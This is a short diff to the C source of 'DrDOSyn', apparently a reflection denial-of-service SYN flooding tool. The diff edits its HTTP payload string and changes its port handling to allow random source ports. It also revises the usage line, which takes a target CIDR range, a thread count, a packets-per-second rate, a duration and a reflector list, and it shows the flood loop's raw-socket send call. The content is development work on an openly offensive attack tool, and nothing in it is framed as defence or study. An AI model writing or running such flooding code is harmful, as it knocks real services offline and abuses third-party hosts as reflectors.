@@ -18,10 +18,7 @@
 
 /*gcc -pthread drdCidr.c -o drdossyn -lm*/
 
-static const char middlePayload[] =
-	"GET / HTTP/1.1\r\n"
-	"Host: facebook.com\r\n"
-	"\r\n";
+static const char middlePayload[] = "GET / HTTP/1.1\r\nHost: example.com\r\nAccept-Encoding: identity\r\n\r\n";
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -331,7 +328,7 @@ void *flood(void *par1)
 			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 		}
 
-		if (floodport == 0)
+		if (floodport <= 0)
 		{
 			tcph->source = htons(randnum(1, 65535));
 		}
@@ -434,7 +431,7 @@ int main(int argc, char *argv[])
 	if (argc < 7)
 	{
 		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List]\n", argv[0]);
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port, < 0 for random] [Threads] [PPS] [Time] [List]\n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
